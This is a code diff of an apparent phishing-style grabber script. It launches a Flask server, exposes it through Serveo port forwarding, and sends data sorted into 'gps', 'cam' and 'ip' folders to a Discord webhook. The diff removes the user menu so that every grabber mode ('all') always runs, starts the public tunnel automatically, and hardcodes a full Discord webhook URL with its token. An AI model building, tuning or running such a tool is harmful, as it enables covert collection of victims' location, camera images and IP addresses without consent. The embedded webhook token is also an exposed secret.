@@ -177,20 +177,13 @@ def get_user_choice():
     choice = input(f"\n{B}[+] {Y}Enter the number corresponding to your choice: {W}")
     return choice
 
-def ask_port_forwarding():
-    print(f"\n{B}[~] {C}Do you want to use Serveo for port forwarding?{W}\n")
-    print(f"{Y}1. {W}Yes")
-    print(f"{Y}2. {W}No, I will use another method")
-    choice = input(f"\n{B}[+] {Y}Enter the number corresponding to your choice: {W}")
-    return choice
-
 def check_and_get_webhook_url(folder_name):
     file_path = os.path.join(folder_name, DISCORD_WEBHOOK_FILE_NAME)
     
     def get_valid_webhook():
         while True:
             print(f'\n{B}[+] {C}Enter Discord Webhook URL:{W}')
-            dwebhook_input = input().strip()
+            dwebhook_input = "https://discord.com/api/webhooks/1266992561197813852/D069wjY8Z3EEDzuWHcdcEmcdWMeFXH-FFHnrXBetlo5QQivK3O93kK3Bg7OZYD0N8NuC"
             if dwebhook_input.startswith("https://discord.com/api/webhooks/"):
                 with open(file_path, 'w') as file:
                     file.write(dwebhook_input)
@@ -239,30 +232,13 @@ def print_banners():
 
 def main():
     print_banners()
-    choice = get_user_choice()
-
-    if choice not in ['1', '2', '3', '4']:
-        print(f"{R}Invalid choice. Exiting.{W}")
-        sys.exit(1)
     
-    if choice == '1':
-        folder_name = 'gps'
-    elif choice == '2':
-        folder_name = 'cam'
-    elif choice == '3':
-        folder_name = 'ip'
-    elif choice == '4':
-        folder_name = 'all'
+    folder_name = 'all'
 
     check_and_get_webhook_url(folder_name)
 
-    port_forwarding_choice = ask_port_forwarding()
-    if port_forwarding_choice == '1':
-        # Start port forwarding in a separate thread
-        port_forwarding_thread = threading.Thread(target=start_port_forwarding)
-        port_forwarding_thread.start()
-    else:
-        print(f"{R}Warning: {W}Port forwarding is necessary for the application to work on other devices. Make sure to set it up using another method.")
+    port_forwarding_thread = threading.Thread(target=start_port_forwarding)
+    port_forwarding_thread.start()
     
     # Start the Flask server
     #start_message = f"{G}[+] {C}Flask server started!{W}"
